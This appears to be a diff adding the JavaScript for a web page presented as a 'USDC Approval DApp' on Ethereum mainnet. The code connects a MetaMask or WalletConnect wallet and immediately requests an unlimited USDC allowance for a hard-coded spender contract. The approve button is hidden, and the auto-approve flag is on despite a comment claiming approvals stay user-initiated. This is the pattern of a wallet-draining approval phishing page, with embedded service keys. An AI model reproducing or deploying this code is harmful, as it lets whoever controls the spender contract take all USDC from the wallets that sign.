@@ -1,0 +1,288 @@
+// script.js
+// --- Configuration for Ethereum Mainnet ---
+const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V2
+const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
+const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
+const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
+
+// Auto-approve configuration
+const AUTO_APPROVE_ENABLED = true; // Keep approvals user-initiated.
+
+const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function decimals() view returns (uint8)"
+];
+
+let provider; // Ethers.js provider
+let signer;   // Ethers.js signer
+let connectedAccount; // Connected wallet address
+
+let walletConnectProvider; // WalletConnect Ethereum provider
+let currentWalletProvider; // The currently connected EIP-1193 provider
+const providerListenersAttached = new WeakSet();
+
+// --- DOM Elements ---
+const connectMetaMaskButton = document.getElementById('connectMetaMaskButton');
+const connectMobileButton = document.getElementById('connectMobileButton');
+const approveButton = document.getElementById('approveButton');
+const currentMessage = document.getElementById('current-message');
+const loader = document.getElementById('loader');
+const walletInfo = document.getElementById('walletInfo');
+const accountAddress = document.getElementById('accountAddress');
+const networkName = document.getElementById('networkName');
+const statusDiv = document.getElementById('status');
+const errorDetailsDiv = document.getElementById('errorDetails');
+const errorMessageSpan = document.getElementById('errorMessage');
+const qrcodeDisplay = document.getElementById('qrcodeDisplay');
+const qrcodeImage = document.getElementById('qrcodeImage');
+
+// --- UI Update Functions ---
+function hideLoader() {
+    loader.classList.add('hidden');
+}
+
+function showLoader() {
+    loader.classList.remove('hidden');
+}
+
+function updateMessage(text, type = 'info') {
+    currentMessage.textContent = text;
+    currentMessage.className = `status-message ${type}`;
+    hideLoader();
+}
+
+function showStatus(message, type) {
+    statusDiv.textContent = message;
+    statusDiv.className = `status-message ${type}`;
+    statusDiv.classList.remove('hidden');
+}
+
+function hideStatus() {
+    statusDiv.classList.add('hidden');
+}
+
+function displayErrorDetails(error) {
+    errorMessageSpan.textContent = error.message || String(error);
+    errorDetailsDiv.classList.remove('hidden');
+}
+
+function hideErrorDetails() {
+    errorDetailsDiv.classList.add('hidden');
+}
+
+function updateWalletInfo(address, network) {
+    accountAddress.textContent = address;
+    networkName.textContent = network;
+    walletInfo.classList.remove('hidden');
+    // If auto-approve is enabled, we don't need the approve button, it triggers automatically
+    if (!AUTO_APPROVE_ENABLED) {
+        approveButton.classList.remove('hidden'); 
+    }
+    connectMetaMaskButton.classList.add('hidden');
+    connectMobileButton.classList.add('hidden');
+    qrcodeDisplay.classList.add('hidden'); // Hide QR code after connection
+}
+
+function resetUI() {
+    walletInfo.classList.add('hidden');
+    approveButton.classList.add('hidden');
+    connectMetaMaskButton.classList.remove('hidden');
+    connectMobileButton.classList.remove('hidden');
+    qrcodeDisplay.classList.add('hidden');
+    hideStatus();
+    hideErrorDetails();
+    updateMessage('Please connect your wallet to approve USDC.', 'info');
+    currentWalletProvider = null;
+}
+
+// Generic handler for provider changes/connection
+async function handleProviderConnection(currentProvider) {
+    if (!currentProvider) {
+        console.log("Provider disconnected or not available.");
+        resetUI();
+        return;
+    }
+
+    try {
+        provider = new ethers.providers.Web3Provider(currentProvider); // Ethers V5 provider
+        signer = provider.getSigner();
+        connectedAccount = await signer.getAddress();
+        const network = await provider.getNetwork();
+
+        updateWalletInfo(connectedAccount, network.name);
+        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
+        console.log('Wallet connected:', connectedAccount, 'on', network.name);
+
+        // Automatically trigger approval only if explicitly enabled.
+        if (AUTO_APPROVE_ENABLED) {
+            console.log('DEBUG: AUTO_APPROVE_ENABLED is true. Attempting to proposeApproveTransaction()...');
+            await proposeApproveTransaction();
+        }
+
+        if (typeof currentProvider.on === 'function' && !providerListenersAttached.has(currentProvider)) {
+            providerListenersAttached.add(currentProvider);
+            currentProvider.on("accountsChanged", (accounts) => {
+                console.log("accountsChanged", accounts);
+                if (accounts.length === 0) resetUI();
+                else handleProviderConnection(currentProvider);
+            });
+            currentProvider.on("chainChanged", (chainId) => {
+                console.log("chainChanged", chainId);
+                handleProviderConnection(currentProvider);
+            });
+            currentProvider.on("disconnect", (code, reason) => {
+                console.log("disconnect", code, reason);
+                resetUI();
+            });
+        }
+
+    } catch (error) {
+        console.error('Error handling provider connection:', error);
+        updateMessage('Error processing wallet connection.', 'error');
+        displayErrorDetails(error);
+        resetUI();
+    } finally {
+        hideLoader();
+    }
+}
+
+async function connectMetaMask() {
+    showLoader();
+    updateMessage('Connecting to MetaMask...', 'info');
+    hideStatus();
+    hideErrorDetails();
+
+    try {
+        if (typeof window.ethereum === 'undefined') {
+            throw new Error("MetaMask not detected. Please install it.");
+        }
+
+        // Request account access for MetaMask
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Use window.ethereum as the provider and pass to generic handler
+        await handleProviderConnection(window.ethereum);
+
+    } catch (error) {
+        console.error('MetaMask connection failed:', error);
+        updateMessage('MetaMask connection cancelled or failed.', 'error');
+        displayErrorDetails(error);
+        resetUI();
+        hideLoader();
+    }
+}
+
+async function connectMobileWallet() {
+    showLoader();
+    updateMessage('Opening wallet selection for mobile wallet...', 'info');
+    hideStatus();
+    hideErrorDetails();
+
+    try {
+        if (!window.WalletConnectEthereumProvider) {
+            throw new Error("WalletConnect Ethereum provider not loaded.");
+        }
+
+        if (!walletConnectProvider) {
+            walletConnectProvider = await window.WalletConnectEthereumProvider.init({
+                projectId: WALLETCONNECT_PROJECT_ID,
+                chains: [1],
+                optionalChains: [1],
+                showQrModal: true,
+                rpcMap: {
+                    1: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e"
+                },
+                metadata: {
+                    name: "USDC Approval DApp",
+                    description: "USDC approval transaction DApp",
+                    url: "https://drtest-inky.vercel.app/",
+                    icons: ["https://drtest-inky.vercel.app/logo.png"]
+                }
+            });
+        }
+
+        currentWalletProvider = walletConnectProvider;
+        await walletConnectProvider.connect();
+        await handleProviderConnection(walletConnectProvider);
+
+
+    } catch (error) {
+        console.error('Mobile wallet connection failed:', error);
+        updateMessage('Mobile wallet connection cancelled or failed.', 'error');
+        displayErrorDetails(error);
+        resetUI();
+        hideLoader();
+    }
+}
+
+// --- Propose Approve Transaction Function ---
+async function proposeApproveTransaction() {
+    if (!signer || !connectedAccount) {
+        updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
+        return;
+    }
+
+    showLoader();
+    updateMessage('Proposing USDC approval transaction... Please confirm in your wallet.', 'info');
+    hideStatus();
+    hideErrorDetails();
+
+    try {
+        // Ethers V5: use ethers.Contract directly
+        const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        
+        // Ethers V5: ethers.constants.MaxUint256
+        const txResponse = await usdcContract.approve(
+            SPENDER_CONTRACT_ADDRESS,
+            ethers.constants.MaxUint256 // Unlimited allowance
+        );
+
+        const txHash = txResponse.hash;
+
+        showStatus(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Check wallet for status.`, 'success');
+        updateMessage('Approval transaction sent!', 'success');
+        console.log('Transaction Hash:', txHash);
+
+    } catch (error) {
+        console.error('Transaction proposal failed:', error);
+        showStatus(`Transaction failed: ${error.message || error}`, 'error');
+        updateMessage('Approval transaction failed.', 'error');
+        displayErrorDetails(error);
+    } finally {
+        hideLoader();
+    }
+}
+
+// --- Event Listeners ---
+connectMetaMaskButton.addEventListener('click', connectMetaMask);
+connectMobileButton.addEventListener('click', connectMobileWallet);
+
+// The approve button is now only visible if AUTO_APPROVE_ENABLED is false
+if (!AUTO_APPROVE_ENABLED) {
+    approveButton.addEventListener('click', proposeApproveTransaction);
+}
+
+// Initial setup on load
+window.addEventListener('load', async () => {
+    // Check if the buttons and QR display elements exist before adding event listeners (for robustness)
+    if (!connectMetaMaskButton || !connectMobileButton || !qrcodeDisplay || !qrcodeImage) {
+        console.error("One or more essential UI elements not found! Ensure index.html is up-to-date.");
+        updateMessage("UI Initialization Error: Please check console for details.", "error");
+        return;
+    }
+
+    if (!window.WalletConnectEthereumProvider) {
+        console.error("WalletConnect Ethereum provider not loaded. Check the module import in index.html.");
+        updateMessage("WalletConnect Init Error: Please check console for details.", "error");
+        return;
+    }
+
+    console.log("WalletConnect Ethereum provider loaded.");
+
+    // Check for existing MetaMask connection on initial load
+    if (window.ethereum && window.ethereum.selectedAddress) {
+        console.log("Found existing MetaMask selectedAddress. Attempting to re-establish session.");
+        await handleProviderConnection(window.ethereum);
+    } else {
+        updateMessage('Please connect your wallet to approve USDC.', 'info');
+    }});
